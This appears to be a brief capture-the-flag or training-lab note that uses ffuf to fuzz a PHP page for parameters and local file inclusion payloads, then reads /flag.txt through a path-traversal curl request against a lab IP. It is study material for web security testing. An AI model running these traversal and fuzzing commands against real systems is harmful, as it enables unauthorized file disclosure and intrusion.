# [Automated Scanning](Automated%20Scanning.md)
### Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt

```shell
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154.57.164.76:31931/index.php?FUZZ=value' -fs 2309
```
![](Screenshot%202026-07-01%20at%2013.44.46.png)

```shell
ffuf -w haddix.txt:FUZZ -u 'http://154.57.164.76:31931/index.php?view=../../../../../../../../../../../../../../../../../FUZZ' -fs 1935
```

```curl
curl http://154.57.164.76:31931/index.php?view=../../../../../../../../../../../../../../../../../flag.txt
```
![](Screenshot%202026-07-01%20at%2013.50.23.png)